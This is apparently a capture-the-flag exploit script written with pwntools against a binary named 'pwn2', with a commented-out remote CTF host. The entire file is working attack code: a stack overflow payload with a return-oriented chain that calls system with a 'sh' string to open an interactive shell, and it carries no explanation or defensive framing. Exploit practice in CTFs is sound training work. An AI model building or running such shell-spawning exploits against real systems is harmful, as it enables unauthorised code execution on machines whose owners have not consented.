from pwn import *

r = process("./pwn2",env={'LD_PRELOAD':'./libc.so.6'})
#r = remote('ctf.kuality.kr',12351)
#gdb.attach(r,"b* 0x0000000000400ab9")
payload = ''
payload += p64(0x0)*2
payload += "B"*0x8  # rbp
payload += p64(0x0000000000400b83) # pop rdi; ret;   
payload += p64(0x400d41)	# "sh  |"
payload += p64(0x0004006b0)  # system plt
payload += 'C'*(0x100-8*6)
payload += p64(0x0)*2
payload += "B"*0x8  # rbp
payload += p64(0x0000000000400b83) # pop rdi; ret;   
payload += p64(0x400d41)	# "sh  |"
payload += p64(0x0004006b0)  # system plt
payload += 'C'*(0x100-8*6)
payload += p64(0xdeadbeef)

r.sendlineafter("Input data : ",payload)

r.interactive()
